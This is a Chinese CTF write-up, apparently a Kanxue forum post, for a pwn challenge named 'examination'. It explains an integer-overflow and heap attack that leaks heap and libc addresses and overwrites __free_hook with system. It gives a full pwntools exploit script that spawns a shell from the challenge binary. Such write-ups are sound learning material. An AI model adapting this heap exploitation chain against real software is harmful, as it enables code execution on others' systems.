
# [原创]【ctf2022】examination

[题目链接](<https://bbs.kanxue.com/elink@008K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3L8h3q4@1j5$3S2Q4x3V1k6Y4N6h3W2V1k6g2)9K6c8X3g2$3k6h3&6@1i4K6y4p5x3e0R3@1i4K6t1$3j5h3#2H3i4K6y4n7K9r3q4K6K9q4)9K6c8o6x3K6k6o6q4W2j5K6V1I4i4K6u0V1y4X3x3I4k6q4)9J5k6o6c8U0x3K6y4Q4x3X3b7&6k6X3j5J5i4K6u0V1y4e0f1^5j5K6R3H3x3X3y4W2k6o6V1J5i4K6u0W2k6i4k6W2L8Y4b7>)

## 写在前面

何谓成长？成长就是当你还未成熟的时候脑海中复现的担当。学`pwn`已经半年多了，总不能还称自己是新手了吧。

![img](https://bbs.kanxue.com/upload/attach/202204/943085_PQDECJ55NXRJ2PF.jpg)

![img](https://bbs.kanxue.com/upload/attach/202204/943085_PDTE9XABNF77VNK.jpg)

从之前栈题都不大会，遇到堆题基本放弃，从见了`musl`、`go`、`arm`就躲到现在终于主动去学习相关的知识，这就是成长。成长不仅仅意味着能力的提升，还意味着心灵的成熟，对学习的态度的变化。

最后，引用最近的脑海中一直复现的鼬神的一句话：

**“你并不弱，只是缺乏信念”**

![img](https://bbs.kanxue.com/upload/attach/202204/943085_TX9D4YBBM7HSTBB.jpg)

# 题解

## 思路

通过整型溢出，在`note`段向上伪造结构体实现任意地址写，修改一个`chunk`的`size`，`free`它放入`unsortedbin`，`leak libc`，再通过任意地址写修改`free_hook`为`system`，然后`free('/bin/sh')`实现`shell`的获取。

有些绕过的细节其实调调就能出。

## 难点

这题让我认识到了自己`shit`一样的逆向。

逆不动的时候，可以放`gdb`里调调，拿张草稿纸画画或者在旁边注一下自己好理解的形式，比如：

![img](https://bbs.kanxue.com/upload/attach/202204/943085_Y6CAMHX56MN3Q4T.jpg)

## exp

```python
from pwn import *
from LibcSearcher import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import base64

context.log_level = 'debug'
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.os = 'linux'


def proof_of_work(sh):
    sh.recvuntil(" == ")
    cipher = sh.recvline().strip().decode("utf8")
    proof = mbruteforce(
        lambda x: sha256((x).encode()).hexdigest() == cipher,
        string.ascii_letters + string.digits,
        length=4,
        method='fixed'
    )
    sh.sendlineafter("input your ????>", proof)


# r = remote("chuj.top", 51904)
# proof_of_work(r)

libc = ELF('./libc-2.31.so')
r = process('./examination')


def z():
    gdb.attach(r)


def cho(num):
    r.sendafter("choice>> ", str(num))


def t_add(num):
    cho(1)
    r.sendlineafter('enter the number of questions: ', str(num))


def t_view(idx, cont, size):  # first_view
    cho(3)
    r.sendlineafter("which one? > ", str(idx))
    bool_ = r.recvuntil('comment:')
    if bool_ == "enter your comment:":
        r.send(cont)
    else:
        r.sendline(str(size))
        r.sendafter("enter your comment:", cont)


def t_delet(idx):
    cho(4)
    r.sendafter("which student id to choose?", str(idx))


def t_role(num):
    cho(5)
    r.sendlineafter("role: <0.teacher/1.student>: ", str(num))


def s_changeid(idx):
    cho(6)
    r.sendlineafter("input your id: ", str(idx))


# pre
r.sendlineafter("role: <0.teacher/1.student>: ", str(0))
t_add(1)  # 0
t_add(1)  # 1
t_view(0, hex(0xdeadbeef), 0x300)
t_view(1, hex(0xdeadbeef), 0x300)
t_role(1)
cho(3)
t_role(0)
cho(2)

# leak_heap
t_role(1)
cho(2)
r.recvuntil("Good Job! Here is your reward! ")
heap = int(r.recvuntil('\n', drop=True), base=16) - 0x2a0
log.success('heap:' + hex(heap))
r.sendlineafter("add 1 to wherever you want! addr: ", '00' + str(heap + 0x200))

# make_fake_struct
s_changeid(-15)
cho(4)
pd = p64(heap + 0x968) + p64(0xdeadbeef) + p64(heap + 0x338)
r.sendlineafter("enter your mode!", pd)

# change chunk (0x55555555f330) size 311 to 621
t_role(0)
t_view(-13, p64(0x621), 0x300)

# free_2_trew_in_unsortedbin
t_delet(0)

# change struct 2 leak libc
t_role(1)
s_changeid(-15)
cho(4)
pd = p64(heap + 0x968) + p64(0xdeadbeef) + p64(heap + 0x340)
r.sendlineafter("enter your mode!", pd)
s_changeid(-13)
cho(2)
r.recvuntil("here is the review:\n")
libcbase = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - 0x1ecbe0
log.success('libcbase:' + hex(libcbase))

# set_libc_func
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
log.success('free_hook:' + hex(free_hook))
log.success('system:' + hex(system))

# change_free_hook
s_changeid(-15)
cho(4)
pd = p64(heap + 0x968) + p64(0xdeadbeef) + p64(free_hook)
r.sendlineafter("enter your mode!", pd)
t_role(0)
t_view(-13, p64(system), 0x300)

# get_shell
t_add(1)
t_view(1, '/bin/sh\x00', 0x300)
t_delet(1)
r.interactive()
```
